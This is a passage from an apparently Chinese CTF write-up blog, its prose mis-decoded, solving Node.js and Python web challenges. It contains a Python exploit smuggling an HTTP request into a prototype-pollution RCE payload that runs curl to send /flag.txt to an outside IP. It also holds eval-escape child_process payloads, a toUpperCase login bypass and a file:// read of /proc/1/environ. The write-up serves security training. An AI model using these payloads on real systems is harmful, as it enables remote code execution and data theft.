class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// æ¶ˆè´¹å“åº”æ•°æ®ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1001.2101.3001.7020">åŸå‹é“¾</a>æ±¡æŸ“ï¼Œ<code>__proto__</code>è¢«è¿‡æ»¤ï¼Œä½¿ç”¨<code>constructor.prototype</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722094915229.png" alt="image-20240722094915229"></p>
<p>è®¿é—®&#x2F;copyçš„ipè¢«é™åˆ¶ï¼Œé€šè¿‡è®¿é—®&#x2F;curlåˆ©ç”¨HTTPèµ°ç§å‘&#x2F;copyå‘é€POSTè¯·æ±‚ï¼Œç„¶åæ±¡æŸ“åŸå‹é“¾å®ç°ä»£ç æ‰§è¡Œã€‚curlè·¯ç”±åªæœ‰qå‚æ•°å¯æ§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>POSTé“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 155</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;x;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl 101.37.27.18:4444/`cat /flag.txt`&#x27;);var x&quot;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">data</span>):</span><br><span class="line">    tmp = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://node4.anna.nssctf.cn:28807/curl?q=&#x27;</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722100733444.png" alt="image-20240722100733444"></p>
<h2 id="GFCTF-2021-ez-calc-1"><a href="#GFCTF-2021-ez-calc-1" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>é¢˜ç›®æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åˆ«æƒ³å¤ªå¤æ‚ï¼Œè¯•ç€ä¼ ä¼ å…¶ä»–æ•°æ®ç±»å‹</span><br><span class="line">2.å­—ç¬¦ä¸²çš„lengthå’Œæ•°ç»„çš„lengthæ˜¯ä¸ä¸€æ ·çš„ã€‚ä½ èƒ½å°†è‡ªå·±çš„payloadé€ƒé€¸å‡ºæ¥å—ã€‚æ³¨ï¼šæœ¬é¢˜æ‰€æœ‰æç¤ºéƒ½åªé’ˆå¯¹ç™»é™†åçš„æ“ä½œã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722101425663.png" alt="image-20240722101425663"></p>
<p>å°å†™å¾—æ˜¯adminå¤§å†™å¾—æ˜¯ADMINã€‚è€ƒç‚¹æ˜¯toUpperCaseå‡½æ•°è¿›è¡Œå¤§å†™è½¬æ¢çš„æ—¶å€™å­˜åœ¨æ¼æ´ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦<code>Ä±</code>ä¼šå˜æˆ<code>I</code><br>è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´â€Ä±â€.toUpperCase() &#x3D;&#x3D; â€˜Iâ€™ï¼Œâ€œÅ¿â€.toUpperCase() &#x3D;&#x3D; â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶<br>åŒæ ·çš„â€â„ªâ€çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯â€â„ªâ€.toLowerCase() &#x3D;&#x3D; â€˜kâ€™.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚</span><br><span class="line">åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚</span><br></pre></td></tr></table></figure>

<p>admÄ±n&#x2F;admin123</p>
<p>æˆåŠŸå¯¹æ¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722101811761.png" alt="image-20240722101811761"></p>
<p>æºç åœ¨f12ä¸­å¯ä»¥çœ‹åˆ°</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆªå–</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//å»ç©º</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>eval(calc)äº§ç”Ÿå‘½ä»¤æ‰§è¡Œ</p>
<p>ä½†æ˜¯sliceæ˜¯ä»ç¬¬å››çš„å…ƒç´ å¼€å§‹æ›¿æ¢ï¼Œå­˜åœ¨é€»è¾‘é—®é¢˜ï¼Œå¯ä»¥é€ƒé€¸å‰å››ä¸ªå­—ç¬¦ï¼ˆä»»æ„å€¼ï¼‰ï¼Œä¼šå‘ç°å¯ä»¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­å®ç°é€ƒé€¸</p>
<p>ç¦æ­¢äº† <code>x</code> ä¸èƒ½æœ‰<code>exec</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722103234648.png" alt="image-20240722103234648"></p>
<p>å°è¯•è¯»å–æ–‡ä»¶ï¼Œæ²¡æœ‰å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<p>å†™å…¥é™æ€æ–‡ä»¶è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&gt;a&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>

<h2 id="HDCTF-2023-YamiYami-1"><a href="#HDCTF-2023-YamiYami-1" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p>ä¸‰ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªä¸ªæ¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190813787.png" alt="image-20240722190813787"></p>
<p>è¯»å–ï¼Œphpä¼ªåè®®ç›´æ¥è¯»ï¼Œè¯»flgaå’Œapp.pyæ—¶æœ‰è¿‡æ»¤</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190752517.png" alt="image-20240722190752517"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722190930204.png" alt="image-20240722190930204"></p>
<p>è¯»å–ç¯å¢ƒå˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28745/read?url=file:///proc/1/environ</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722191042710.png" alt="image-20240722191042710"></p>
<p>æ— ç–‘æ˜¯éé¢„æœŸè§£ï¼Œè¿™é‡Œè¦è·å–æºç </p>
<p>urllib.request.urlopen<code>å¯ä»¥ç›´æ¥æ¥å—urlencodeçš„è·¯å¾„, ä½†æ˜¯è¯»æœ¬åœ°æ–‡ä»¶æ—¶æœ€å‰é¢çš„</code>&#x2F;<code>è¦ä¿ç•™, ä¸èƒ½ç¼–ç ä¸º</code>%2F</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯¹&#x2F;app&#x2F;app.pyè¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œç¬¬ä¸€ä¸ª<code>/</code>ä¸èƒ½ç¼–ç </p>
<p>å¾—åˆ°</p>
